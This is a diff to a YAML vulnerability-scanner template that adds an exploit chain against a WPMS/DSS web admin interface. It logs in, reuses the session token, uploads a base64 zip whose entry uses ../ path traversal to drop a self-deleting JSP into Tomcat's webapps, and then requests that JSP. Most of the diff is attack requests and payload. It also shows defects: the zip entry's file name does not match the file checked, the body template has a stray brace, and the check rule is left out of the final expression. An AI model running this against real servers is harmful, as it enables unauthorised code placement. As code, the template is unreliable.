@@ -18,6 +18,12 @@ set:
   rboundary: randomLowercase(8)
   username: randomLowercase(8)
   password: randomLowercase(8)
+  randfile: randomLowercase(8)
+  filename: string("../../../../../../../../../../../../../opt/tomcat/webapps/upload/" + randfile + ".jsp")
+  randstring: randomLowercase(8)
+  filecontent: bytes("<% out.print(\"" + randstring + "\"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>")
+  zip: base64Decode("UEsDBBQACAAIAAAAAAAAAAAAAAAAAAAAAABTAAAALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vb3B0L3RvbWNhdC93ZWJhcHBzL3VwbG9hZC90ZXN0MTIzdGVzdDEyMy5qc3AcyMEKwjAMBuBXCYVBy6AvMPHoWfS6S3A/MxLSmmXz9UWv32mgtkftLhZ5TolGcrZlCxdbaaQ0pzKR4UMvPrhKqxdRZO5d5cEhzeqKuIH1yvHMjveOLX52hx+K+HMppS5QBHKZhvM3AAD//1BLBwhfZZzKawAAAHUAAABQSwECFAAUAAgACAAAAAAAX2WcymsAAAB1AAAAUwAAAAAAAAAAAAAAAAAAAAAALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vb3B0L3RvbWNhdC93ZWJhcHBzL3VwbG9hZC90ZXN0MTIzdGVzdDEyMy5qc3BQSwUGAAAAAAEAAQCBAAAA7AAAAAAA")
+  encPass: md5(username + ":dss:" + password)
 rules:
   r0:
     request:
@@ -99,18 +105,48 @@ rules:
       pubkey: search['pubkey']
       enc_password: base64(rsaEncryptPKCS1v15(bytes(password),pubkey))
 
-  # r3:
-  #   request:
-  #     method: POST
-  #     path: /WPMS/login
-  #     headers:
-  #       Content-Type: application/json
-  #     body: |
-  #       {"loginName":"{{username}}","loginPass":"{{enc_password}}","timestamp":"16853622671401904168273612873678126378126387"}
-  #   expression: response.body.bcontains(b'"success":"true"')
-  #   output:
-  #     search: |
-  #       '"token":"(?P<token>.*?)"'.bsubmatch(response.body)
-  #     token: search['token']
+  r3:
+    request:
+      method: POST
+      path: /WPMS/login
+      headers:
+        Content-Type: application/json
+      body: |
+        {"loginName":"{{username}}","loginPass":"{{enc_password}}","timestamp":"16853622671401904168273612873678126378126387"}
+    expression: response.body.bcontains(b'"success":"true"')
+    output:
+      search: |
+        '"token":"(?P<token>.*?)"'.bsubmatch(response.body)
+      token: search['token']
 
-expression: r0() && r1() && r2() #&& r3()
+  r4:
+    request:
+      method: GET
+      path: /admin/login_login.action?subSystemToken={{token}}
+      headers:
+        Cookie: JSESSIONID={{sid}}
+    expression: true
+
+  r5:
+    request:
+      method: POST
+      path: /admin/recover_recover.action?password={{encPass}}
+      headers:
+        Cookie: JSESSIONID={{sid}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9c9BBHdk0NgAjoxz
+      body: "------WebKitFormBoundary9c9BBHdk0NgAjoxz\r\n\
+            Content-Disposition: form-data; name=\"recoverFile\"; filename=\"test1.zip\"\r\n\
+            Content-Type: application/zip\r\n\
+            \r\n\
+            {{zip}}}\r\n\
+            ------WebKitFormBoundary9c9BBHdk0NgAjoxz--
+            "
+    expression: true
+
+  r6:
+    request:
+      method: GET
+      path: /upload/{{randfile}}.jsp
+    expression: response.body.bcontains(bytes(randstring))
+
+expression: r0() && r1() && r2() && r3() && r4() && r5()
